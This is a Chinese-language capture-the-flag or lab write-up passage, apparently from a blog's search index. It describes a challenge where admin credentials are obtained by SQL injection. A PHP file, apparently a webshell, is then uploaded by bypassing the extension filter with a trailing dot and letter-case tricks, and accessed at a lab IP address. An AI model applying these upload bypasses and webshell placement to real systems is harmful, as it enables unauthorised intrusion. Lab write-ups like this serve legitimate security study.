<h2 id="4-geez"><a href="#4-geez" class="headerlink" title="4.geez"></a>4.geez</h2><p>同样sql注入得到账户名密码：admin/admin445</p>
<p>发现进去就有上传文件的点。用fuzz模糊测试发现很好绕过。直接php.即可。</p>
<p>然后在主页再检查头像的地址：</p>
<p>得到上传文件：</p>
<figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line">./upload/<span class="number">1</span>_dama1.php.</span><br></pre></td></tr></table></figure>

<p>访问：</p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">http:<span class="regexp">//</span><span class="number">47.105</span>.<span class="number">75.177</span><span class="regexp">/vulnlab/u</span>pload<span class="regexp">/denglu/u</span>pload<span class="regexp">/1_dama1.php.</span></span><br></pre></td></tr></table></figure>

<p>发现不能解析。</p>
<p>改为大小写绕过得到上传文件：</p>
<figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line">./upload/<span class="number">1</span>_dama1.php</span><br></pre></td></tr></table></figure>

<p>访问：</p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">http:<span class="regexp">//</span><span class="number">47.105</span>.<span class="number">75.177</span><span class="regexp">/vulnlab/u</span>pload<span class="regexp">/denglu/u</span>pload<span class="regexp">/1_dama1.php</span></span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>web安全</category>
      </categories>
      <tags>
        <tag>web</tag>
        <tag>文件上传</tag>
      </tags>
  </entry>
</search>
